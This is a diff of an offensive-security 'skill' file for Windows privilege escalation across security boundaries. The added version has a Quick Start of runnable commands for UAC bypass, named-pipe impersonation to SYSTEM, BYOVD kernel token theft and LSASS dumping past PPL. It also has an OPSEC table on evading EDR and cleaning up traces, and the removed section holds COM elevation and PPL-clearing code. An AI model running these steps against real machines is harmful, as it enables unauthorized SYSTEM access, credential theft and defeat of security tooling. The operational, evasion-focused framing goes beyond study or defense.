@@ -1,427 +1,128 @@
 ---
 name: windows-boundaries
-description: Windows security boundary attacks — kernel/user boundary, sandbox escape, AppContainer/LPAC bypass, COM/RPC boundary, integrity levels, PPL exploitation
+description: Windows security-boundary attacks — kernel/user crossing (win32k/dxgkrnl UAF CVE-2025-24983/62573), BYOVD kernel R/W (CVE-2025-8061, EDRKillShifter), UAC/COM elevation (ICMLuaUtil/fodhelper), AppContainer/LPAC & Chromium-Mojo sandbox escape (CVE-2025-2783/4609), PPL bypass (BYOVDLL CVE-2023-28229), RPC/ALPC & named-pipe impersonation (PhantomRPC, Potato)
 metadata:
   type: offensive
   phase: exploitation
+  tools: WinDbg, OleViewDotNet, NtObjectManager, PrintSpoofer, GodPotato, PPLBlade, UACME, loldrivers, Sysmon
+  mitre: TA0004
 kill_chain:
   phase: [exploit, install]
   step: [4, 5]
-  attck_tactics: [TA0002, TA0004]
+  attck_tactics: [TA0002, TA0004, TA0005]
+  attck_techniques: [T1068, T1211, T1548.002, T1134.001, T1134.002, T1543.003, T1559, T1112, T1003.001, T1014]
 depends_on: [privesc-windows, exploit-development]
-feeds_into: [red-team-ops]
-inputs: [sandbox_config, kernel_info]
-outputs: [boundary_escape, elevated_access]
-  ---
+feeds_into: [red-team-ops, edr-evasion]
+inputs: [sandbox_config, kernel_info, foothold_token]
+outputs: [boundary_escape, elevated_access, kernel_rw_primitive, system_token]
+references:
+  - references/kernel-user-boundary.md
+  - references/byovd-kernel-rw.md
+  - references/integrity-uac-com.md
+  - references/sandbox-appcontainer-escape.md
+  - references/ppl-protected-process.md
+  - references/rpc-alpc-boundary.md
+scripts:
+  - scripts/enum_boundaries.ps1
+  - scripts/ioctl_fuzzer.py
+  - scripts/byovd_kernel_rw.c
+  - scripts/uac_com_elevate.cpp
+  - scripts/sandbox_escape_probe.py
+  - scripts/ppl_byovdll.c
+  - scripts/named_pipe_impersonate.c
+---
 
 # Windows Security Boundaries
 
 ## When to Activate
 
-- Planning privilege escalation paths through security boundaries
-- Sandbox escape research (browser, Office, AppContainer)
-- Understanding Windows security architecture for exploitation
-- Kernel/user boundary crossing
+- Planning a privilege-escalation path that crosses a Windows security boundary
+  (integrity level, AppContainer/LPAC, PPL, or the kernel/user line)
+- Sandbox-escape research: browser renderer (Chromium/Edge Mojo), Office WebView, packaged
+  apps, AppContainer/LPAC brokers
+- Reaching Ring 0 via win32k/dxgkrnl bugs or BYOVD for a kernel read/write primitive
+- Defeating PPL to dump LSASS or tamper with EDR self-defense
+- Going from a `SeImpersonate` service account to SYSTEM via RPC/ALPC/named-pipe abuse
+- UAC bypass (Medium → High) via auto-elevating COM or registry hijack
 
-## Security Boundary Taxonomy
+## Boundary stack (high → low): VTL1 (Secure Kernel/Cred Guard) > Ring 0 (ntoskrnl/win32k/drivers) > Ring 3: System > High > Medium > Low > AppContainer/LPAC. PPL is an orthogonal wall guarding LSASS/EDR even from SYSTEM.
 
-```
-┌─────────────────────────────────────────────────────┐
-│                    VTL1 (Secure World)               │
-│  Credential Guard, HVCI, Secure Kernel              │
-├─────────────────────────────────────────────────────┤
-│                    VTL0 (Normal World)               │
-│  ┌───────────────────────────────────────────────┐  │
-│  │              Kernel Mode (Ring 0)              │  │
-│  │  ntoskrnl, win32k, drivers                    │  │
-│  ├───────────────────────────────────────────────┤  │
-│  │              User Mode (Ring 3)               │  │
-│  │  ┌─────────────────────────────────────────┐  │  │
-│  │  │  High Integrity (Admin)                 │  │  │
-│  │  │  ┌───────────────────────────────────┐  │  │  │
-│  │  │  │  Medium Integrity (Standard User) │  │  │  │
-│  │  │  │  ┌─────────────────────────────┐  │  │  │  │
-│  │  │  │  │  Low Integrity              │  │  │  │  │
-│  │  │  │  │  ┌───────────────────────┐  │  │  │  │  │
-│  │  │  │  │  │  AppContainer/LPAC   │  │  │  │  │  │
-│  │  │  │  │  │  (Untrusted)         │  │  │  │  │  │
-│  │  │  │  │  └───────────────────────┘  │  │  │  │  │
-│  │  │  │  └─────────────────────────────┘  │  │  │  │
-│  │  │  └───────────────────────────────────┘  │  │  │
-│  │  └─────────────────────────────────────────┘  │  │
-│  └───────────────────────────────────────────────┘  │
-└─────────────────────────────────────────────────────┘
-```
+## Technique Map
 
-## Kernel/User Boundary
+| Technique | ATT&CK | CWE | Reference | Script |
+|-----------|--------|-----|-----------|--------|
+| win32k / dxgkrnl UAF → kernel R/W → token steal | T1068 | CWE-416 | references/kernel-user-boundary.md | scripts/ioctl_fuzzer.py |
+| Driver IOCTL abuse (METHOD_NEITHER arb-R/W) | T1068 | CWE-781 | references/kernel-user-boundary.md | scripts/ioctl_fuzzer.py |
+| BYOVD load + MSR/LSTAR or phys R/W → SYSTEM | T1068, T1543.003 | CWE-1188 | references/byovd-kernel-rw.md | scripts/byovd_kernel_rw.c |
+| BYOVD EDR-kill (callback nulling) | T1562.001, T1014 | CWE-1188 | references/byovd-kernel-rw.md | scripts/byovd_kernel_rw.c |
+| UAC bypass — ICMLuaUtil elevated COM moniker | T1548.002 | CWE-269 | references/integrity-uac-com.md | scripts/uac_com_elevate.cpp |
+| UAC bypass — fodhelper HKCU registry hijack | T1548.002, T1112 | CWE-269 | references/integrity-uac-com.md | scripts/uac_com_elevate.cpp |
+| AppContainer/LPAC broker abuse / cap over-grant | T1211 | CWE-668 | references/sandbox-appcontainer-escape.md | scripts/sandbox_escape_probe.py |
+| Chromium/Edge Mojo IPC sandbox escape | T1211 | CWE-501 | references/sandbox-appcontainer-escape.md | scripts/sandbox_escape_probe.py |
+| Named-object / symbolic-link squatting | T1211 | CWE-59 | references/sandbox-appcontainer-escape.md | scripts/sandbox_escape_probe.py |
+| PPL bypass — BYOVDLL (old signed DLL into PPL) | T1003.001, T1211 | CWE-426 | references/ppl-protected-process.md | scripts/ppl_byovdll.c |
+| PPL bypass — live-dump / WER / Protection-clear | T1003.001, T1562.001 | CWE-269 | references/ppl-protected-process.md | scripts/byovd_kernel_rw.c |
+| RPC server spoof / endpoint squat (PhantomRPC) | T1559, T1134.001 | CWE-287 | references/rpc-alpc-boundary.md | scripts/named_pipe_impersonate.c |
+| Named-pipe client impersonation (Potato family) | T1134.002, T1134.001 | CWE-294 | references/rpc-alpc-boundary.md | scripts/named_pipe_impersonate.c |
+| Host boundary posture enumeration | T1082 | CWE-693 | (all) | scripts/enum_boundaries.ps1 |
 
-### Attack Surface
-- System calls (ntoskrnl, win32k)
-- IOCTLs to kernel drivers
-- Shared memory sections
-- GDI/DirectX objects
+## Quick Start
 
-### Exploitation Vectors
-```c
-// win32k.sys — historically most exploited Windows kernel component
-// Attack: trigger vulnerability via GDI/USER syscalls from user mode
-// Common bug classes: UAF in window objects, integer overflow in font parsing
+```cmd
+:: 0. Map the host's boundary posture -> pick the right primitive
+powershell -ep bypass -File scripts/enum_boundaries.ps1
+::    reports: integrity, AppContainer, SeImpersonate/SeDebug, HVCI, driver blocklist,
+::    LSASS RunAsPPL, drivers loaded from user-writable paths, named-pipe count.
 
-// Driver IOCTLs — third-party drivers often vulnerable
-// Attack: send crafted IOCTL to driver device object
-HANDLE hDevice = CreateFileA("\\\\.\\VulnDriver", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
-DeviceIoControl(hDevice, IOCTL_CODE, inputBuf, inputSize, outputBuf, outputSize, &bytesReturned, NULL);
+:: 1. From a sandbox (renderer/packaged app): rank escape vectors
+python scripts/sandbox_escape_probe.py
 
-// BYOVD (Bring Your Own Vulnerable Driver)
-// Load known-vulnerable signed driver, exploit it for kernel R/W
-// Popular targets: RTCore64.sys, dbutil_2_3.sys, ene.sys, gdrv.sys
-```
+:: 2. Medium -> High: UAC bypass (no file dropped via COM moniker)
+uac_com_elevate.exe com "C:\Windows\System32\cmd.exe /c whoami /groups > C:\poc.txt"
 
-### Kernel Exploitation Primitives
-```
-1. Arbitrary Read → leak kernel addresses (bypass KASLR)
-2. Arbitrary Write → overwrite token privileges, disable PPL
-3. Common targets:
-   - EPROCESS.Token → steal SYSTEM token
-   - EPROCESS.Protection → disable PPL
-   - PreviousMode → set to KernelMode for unrestricted syscalls
+:: 3. SeImpersonate present -> SYSTEM via PhantomRPC endpoint squat
+whoami /priv | findstr SeImpersonate
+named_pipe_impersonate.exe \\.\pipe\W32TIME "C:\Windows\System32\cmd.exe"
+w32tm /resync                          :: triggers the SYSTEM client to connect
+
+:: 4. Need Ring 0: map a driver's IOCTLs, then BYOVD kernel R/W -> token steal
+python scripts/ioctl_fuzzer.py --device RTCore64 --map
+byovd_kernel_rw.exe C:\test\driver.sys token
+
+:: 5. Dump LSASS under PPL without a driver (BYOVDLL / CNG KSP)
+ppl_byovdll.exe register C:\stage\vuln_ncryptprov.dll GhostKsp
+ppl_byovdll.exe trigger  GhostKsp
 ```
 
-## Integrity Level Boundaries
+## OPSEC & Detection (summary)
 
-### Levels
-| Level | Value | Examples |
-|-------|-------|----------|
-| System | 0x4000 | SYSTEM services |
-| High | 0x3000 | Elevated admin processes |
-| Medium | 0x2000 | Standard user processes |
-| Low | 0x1000 | Protected Mode IE, some sandboxes |
-| Untrusted | 0x0000 | AppContainer processes |
+| Technique | Telemetry / IOC | Detection (Sigma / EDR) | OPSEC note |
+|-----------|-----------------|--------------------------|------------|
+| win32k/dxgkrnl exploit | Bugcheck EID 1001 ref win32k/dxgkrnl; process token flips to S-1-5-18 with no service genealogy | Sigma on bugchecks + token anomaly; ETW Microsoft-Windows-Win32k | Prefer data-only token copy over CFG/CET-fighting control-flow hijack; missed race = loud bugcheck |
+| BYOVD | Sysmon EID 6 driver load from user-writable path; 7045/4697 kernel service; EDR telemetry goes silent | Sigma on unusual driver path + known-bad hashes (loldrivers.io); driver-load-time window | Use un-blocklisted/HVCI-compatible driver; restore LSTAR/callbacks; DeleteService + del .sys |
+| UAC bypass (COM/fodhelper) | Sysmon EID 13 write to HKCU ms-settings\Shell\Open\command; dllhost /Processid:{3E5FC7F9..} spawning shell | Elastic/ManageEngine ICMLuaUtil + fodhelper rules | Rotate to a less-known AutoElevate CLSID; don't spawn cmd from dllhost; clean HKCU tree |
+| Sandbox escape | Renderer/GPU process spawning cmd/powershell/rundll32; Mojo handle-transfer anomalies | Sigma on browser child-process; patch-posture alert (Edge<134.0.3124.93) | Stay in-process post-escape (IPC layer is an EDR blind spot); symlink squat is mostly dead post-2017 |
+| PPL bypass | Old keyiso/ncryptprov version loaded in lsass (EID 7); EID 10 lsass read; Cryptography\Providers write; live-dump | Sigma on DLL version-mismatch + GrantedAccess to lsass | Driverless (BYOVDLL/WER/live-dump) avoids BYOVD noise; restore Protection byte; obfuscate dumps |
+| RPC/ALPC impersonation | 4624 logon type 9 (Advapi); SYSTEM child of service-acct parent; RPC_S_SERVER_UNAVAILABLE (EID 1) | Elastic named-pipe impersonation rule; ETW RPC + high impersonation level | PhantomRPC endpoint squat blends w/ admin triggers (w32tm/gpupdate); RevertToSelf + close pipe |
 
-### Crossing Boundaries
-```powershell
-# Check integrity level
-whoami /groups | findstr "Mandatory"
+## Deep Dives
 
-# Medium → High: UAC bypass (see privesc-windows skill)
-# Low → Medium: exploit vulnerability in medium-integrity process
-# AppContainer → Low: sandbox escape
-```
-
-## AppContainer / LPAC Sandbox
-
-### What's Restricted
-- No access to user's files (except broker-mediated)
-- No network access without explicit capability
-- No registry access outside own hive
-- No inter-process communication without broker
-- LPAC (Less Privileged AppContainer): even more restricted — no access to named objects
-
-### Escape Vectors
-```
-1. Broker vulnerabilities — the broker process mediates access
-   - File picker broker (allows file access)
-   - Print broker
-   - Clipboard broker
-   
-2. Kernel vulnerabilities — AppContainer is userland enforcement
-   - win32k syscalls still accessible (reduced but not eliminated)
-   - Kernel bug = full escape
-   
-3. COM object abuse — some COM servers run at higher integrity
-   - Find COM objects accessible from AppContainer
-   - Exploit logic bugs in COM server
-   
-4. Named pipe/ALPC — if broker exposes pipe without proper ACL
-   
-5. Capability abuse — overly permissive capabilities granted
-   - internetClient, privateNetworkClientServer
-   - documentsLibrary, picturesLibrary
-```
-
-### Browser Sandbox Escape (Chromium/Edge)
-```
-Renderer (AppContainer/Untrusted) → Browser Process (Medium)
-Attack surface:
-- Mojo IPC interface bugs
-- Shared memory corruption
-- GPU process as intermediate target
-- PDF/extension process boundaries
-
-Typical chain:
-1. Renderer RCE (V8 bug, type confusion)
-2. Sandbox escape (Mojo IPC bug, win32k bug)
-3. Privilege escalation (kernel bug or UAC bypass)
-```
-
-## COM/RPC Boundaries
-
-### COM Elevation
-```c
-// COM objects that auto-elevate (no UAC prompt):
-// CMSTPLUA: {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
-// ICMLuaUtil interface — can launch elevated processes
-
-// Exploit: instantiate elevated COM object, call methods
-CoInitialize(NULL);
-IID iid_ICMLuaUtil = {0x6EDD6D74, 0xC007, 0x4E75, {0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C}};
-CLSID clsid_CMSTPLUA = {0x3E5FC7F9, 0x9A51, 0x4367, {0x90, 0x63, 0xA1, 0x20, 0x24, 0x4F, 0xBE, 0xC7}};
-// CoCreateInstance with CLSCTX_LOCAL_SERVER → runs elevated
-```
-
-### RPC Attack Surface
-```bash
-# Enumerate RPC interfaces
-rpcdump.py target_ip
-# Or: RpcView tool for local enumeration
-
-# Common targets:
-# - Print Spooler RPC (PrintNightmare)
-# - Task Scheduler RPC
-# - EFSRPC (PetitPotam)
-# - MS-DRSR (DCSync)
-```
-
-## Hyper-V / VBS Boundary
-
-### VTL0 → VTL1 (Secure World)
-```
-- VTL1 runs Secure Kernel, Credential Guard, HVCI
-- VTL0 cannot read/write VTL1 memory
-- Escape requires: Hyper-V vulnerability (extremely rare, high bounty)
-- Attack surface: hypercalls, synthetic interrupts, VMBUS
-```
-
-### VM Escape (Guest → Host)
-```
-- Hyper-V attack surface: VMBus, synthetic devices, RemoteFX
-- VMware: SVGA, HGFS, backdoor interface
-- VirtualBox: 3D acceleration, shared folders, guest additions
-- QEMU/KVM: virtio devices, SPICE, USB passthrough
-```
-
-## Practical Boundary Crossing Chains
-
-### Browser → SYSTEM
-```
-1. V8 type confusion → renderer RCE (Untrusted integrity)
-2. Mojo IPC bug → sandbox escape to browser process (Medium)
-3. BYOVD or kernel bug → SYSTEM
-```
-
-### Office Macro → Domain Admin
-```
-1. VBA macro execution (Medium integrity)
-2. AMSI bypass + download Stage 1
-3. Credential harvesting or Kerberoast
-4. Lateral movement → Domain Controller
-5. DCSync → Domain Admin
-```
-
-### Phishing → Kernel
-```
-1. HTML smuggling → ISO → DLL sideload (Medium)
-2. UAC bypass → High integrity
-3. Load vulnerable driver (BYOVD)
-4. Kernel R/W primitive → disable PPL, steal SYSTEM token
-```
-
-## Advanced: Browser Sandbox Escape
-
-### Chromium Sandbox Architecture
-```
-// Chromium uses multi-process architecture:
-// - Browser process: full privileges, manages tabs
-// - Renderer process: sandboxed (AppContainer on Windows)
-// - GPU process: limited sandbox
-// - Network process: limited sandbox
-//
-// Sandbox restrictions (renderer):
-// - No filesystem access (except via IPC to browser)
-// - No network access (except via IPC)
-// - No process creation
-// - Limited Windows API access
-// - AppContainer integrity level (below Low)
-
-// Escape path: Renderer RCE → IPC bug → Browser process
-// IPC mechanism: Mojo (Chromium's IPC framework)
-// Attack surface: every Mojo interface exposed to renderer
-```
-
-### Mojo IPC Exploitation
-```c
-// Mojo interfaces define the renderer→browser attack surface
-// Each interface = potential sandbox escape if mishandled
-
-// Common vulnerability patterns:
-// 1. Type confusion in Mojo message deserialization
-// 2. UAF when interface pointer outlives backing object
-// 3. Race condition between validation and use
-// 4. Missing origin checks (renderer claims wrong origin)
-
-// Exploitation:
-// 1. Achieve renderer RCE (V8 type confusion, JIT bug)
-// 2. Enumerate available Mojo interfaces
-// 3. Fuzz or audit interface implementations in browser process
-// 4. Trigger bug → code execution in browser process (Medium integrity)
-// 5. From browser process: full system access or further escalation
-
-// Historical examples:
-// CVE-2019-5786: FileReader UAF → renderer RCE → Mojo escape
-// CVE-2021-21224: V8 type confusion → Mojo IPC → sandbox escape
-// CVE-2022-0609: Animation UAF → full chain
-```
-
-### Windows Sandbox Escape Techniques
-```c
-// AppContainer escape vectors:
-// 1. Kernel vulnerability (win32k, ntoskrnl)
-//    - AppContainer can still make syscalls
-//    - win32k attack surface reduced but not eliminated
-//    - Kernel bug → SYSTEM (bypasses all userland sandboxes)
-
-// 2. Named object abuse
-//    - Some named objects accessible from AppContainer
-//    - If higher-privilege process opens object with weak DACL
-//    - AppContainer can interact with it
-
-// 3. ALPC/RPC to privileged services
-//    - Some RPC endpoints accessible from AppContainer
-//    - Vulnerability in RPC handler → escape
-//    - Example: Print Spooler accessible from some sandboxes
-
-// 4. Token manipulation
-//    - If sandbox has SeImpersonatePrivilege (rare)
-//    - Potato-style attacks work from sandbox
-//    - Usually sandboxes strip this privilege
-
-// 5. Shared memory / mapped sections
-//    - If shared section has weak permissions
-//    - Corrupt data used by higher-privilege process
-//    - Example: shared font cache corruption → win32k exploit
-```
-
-## Advanced: PPL (Protected Process Light) Exploitation
-
-### PPL Architecture
-```c
-// PPL levels (highest to lowest):
-// - PPL-Windows: OS critical processes
-// - PPL-WinTcb: Windows Trusted Computer Base
-// - PPL-Antimalware: AV/EDR processes (MsMpEng.exe, CrowdStrike)
-// - PPL-Lsa: LSASS (when RunAsPPL enabled)
-// - PP-Authenticode: signed processes
-//
-// PPL prevents:
-// - OpenProcess with PROCESS_VM_READ/WRITE
-// - Debugging (DebugActiveProcess)
-// - Thread injection (CreateRemoteThread)
-// - Memory reading (ReadProcessMemory)
-// - DLL injection
-//
-// Even SYSTEM cannot open PPL process with full access
-```
-
-### PPL Bypass Techniques
-```c
-// 1. BYOVD → kernel R/W → modify EPROCESS.Protection field
-//    Set Protection.Level = 0 → process is no longer protected
-//    Then: normal OpenProcess/ReadProcessMemory works
-BYTE protection_offset = 0x87A;  // Offset varies by Windows version
-WriteKernelMemory(eprocess + protection_offset, 0, 1);  // Clear protection
-
-// 2. PPLdump (abuse PPL-signed DLL)
-//    Load DLL signed with PPL-compatible certificate
-//    DLL runs inside PPL process → can read its memory
-//    Dump LSASS from within PPL context
-
-// 3. PPLKiller (vulnerable driver)
-//    Use signed driver with R/W primitive
-//    Modify EPROCESS.SignatureLevel and Protection
-//    Process becomes unprotected → dump normally
-
-// 4. Mimikatz driver (mimidrv.sys)
-//    Mimikatz's own signed driver
-//    Removes PPL protection from LSASS
-//    Then: sekurlsa::logonpasswords works
-
-// 5. Userland exploit in PPL process
-//    If PPL process has vulnerability (e.g., DLL hijack)
-//    Exploit it → code execution within PPL context
-//    From inside: full access to PPL memory
-```
-
-## Advanced: COM/RPC Boundary Attacks
-
-### COM Activation Attacks
-```c
-// COM objects can be activated cross-process and cross-integrity
-// If COM server runs at higher integrity → potential escalation
-
-// Attack: find COM object that:
-// 1. Runs as SYSTEM or high integrity
-// 2. Exposes dangerous methods (file write, command exec)
-// 3. Accessible from medium/low integrity
-
-// Discovery:
-// OleViewDotNet — enumerate COM objects, check permissions
-// Look for: LaunchPermission allows Everyone/Users
-// Check: methods that take file paths or command strings
-
-// Historical: CMSTPLUA, ICMLuaUtil (UAC bypass via COM)
-// These COM objects auto-elevate and expose ShellExec methods
-```
-
-### RPC Interface Exploitation
-```c
-// Windows RPC: thousands of interfaces, many accessible remotely
-// Each interface = potential attack surface
-
-// Enumeration:
-// rpcdump.py — list RPC interfaces on target
-// RpcView — GUI tool for local RPC interface analysis
-// NtObjectManager — PowerShell module for RPC analysis
-
-// Attack methodology:
-// 1. Enumerate interfaces (rpcdump, ifids)
-// 2. Identify interesting interfaces (file ops, process creation)
-// 3. Check access permissions (who can call?)
-// 4. Fuzz interface methods
-// 5. Exploit: type confusion, buffer overflow, logic bugs
-
-// PetitPotam (MS-EFSRPC): RPC interface that coerces NTLM auth
-// PrinterBug (MS-RPRN): RPC interface that coerces NTLM auth
-// Both: accessible remotely with domain user credentials
-```
-
-## Advanced: Integrity Level Escalation
-
-### Medium → High (UAC Bypass Catalog)
-```powershell
-# Auto-elevating binaries (Microsoft-signed, manifest has autoElevate=true):
-# fodhelper.exe, computerdefaults.exe, sdclt.exe, slui.exe
-# eventvwr.exe, cmstp.exe, wsreset.exe, changepk.exe
-
-# Technique: registry key hijacking
-# These binaries read HKCU registry before executing
-# Attacker writes command to HKCU → binary auto-elevates → executes attacker command
-
-# Example: fodhelper.exe
-# Reads: HKCU\Software\Classes\ms-settings\Shell\Open\command
-# Write payload there → run fodhelper → payload runs elevated
-
-# Environment variable abuse:
-# Some auto-elevate binaries use %SYSTEMROOT% or %WINDIR%
-# If attacker can control env var → DLL hijack in fake system directory
-```
-
-### Low → Medium
-```c
-// Low integrity → Medium integrity is a security boundary
-// Escape vectors:
-// 1. Exploit vulnerability in medium-integrity process
-// 2. Abuse shared resources (clipboard, drag-drop)
-// 3. Exploit broker process (if application uses broker pattern)
-// 4. Kernel vulnerability (bypasses all integrity levels)
-// 5. Time-of-check-time-of-use on shared files
-```
+- **references/kernel-user-boundary.md** — Ring 3→Ring 0 via win32k/dxgkrnl UAF
+  (CVE-2025-24983, CVE-2025-62573, CVE-2025-55224, CVE-2025-62221, CVE-2026-26132), driver
+  IOCTL surface, kernel R/W → EPROCESS token steal / Protection clear / PreviousMode, modern
+  no-PTE-self-map constraint, KDP/HVCI considerations.
+- **references/byovd-kernel-rw.md** — Bring-Your-Own-Vulnerable-Driver: load signed driver,
+  MSR-LSTAR vs physical-memory primitives (CVE-2025-8061), EDRKillShifter / Qilin driver
+  rotation, 2025-2026 driver+CVE catalog, blocklist/HVCI bypass, driver-load detection.
+- **references/integrity-uac-com.md** — integrity model, appinfo/autoElevate internals,
+  fodhelper (UACME 33) + ICMLuaUtil/CMSTPLUA (UACME 41), 2025 IEditionUpgradeManager bypass,
+  finding new AutoElevate COM classes, T1548.002 ITW campaigns.
+- **references/sandbox-appcontainer-escape.md** — AppContainer/LPAC model + capabilities,
+  broker abuse (WinRT XmlDocument), Chromium/Edge Mojo escapes (CVE-2025-2783 ForumTroll,
+  CVE-2025-4609 ipcz), symbolic-link/RtlIsSandboxToken mitigation, 3-bug renderer chain.
+- **references/ppl-protected-process.md** — PS_PROTECTION/signer levels, BYOVDLL "Ghost in
+  the PPL" (CVE-2023-28229/36906, BCryptRegisterProvider), NtSystemDebugControl live-dump
+  (Win11 23H2), WER dump, kernel Protection-clear, PPLBlade, Credential Guard hard stop.
+- **references/rpc-alpc-boundary.md** — named-pipe client impersonation primitive, ALPC
+  SQoS/RequiredServerSid, PhantomRPC server-spoof/endpoint-squat (2026, unpatched), Potato
+  family (PrintSpoofer/GodPotato/SigmaPotato), WER ALPC LPE, NtObjectManager enumeration.
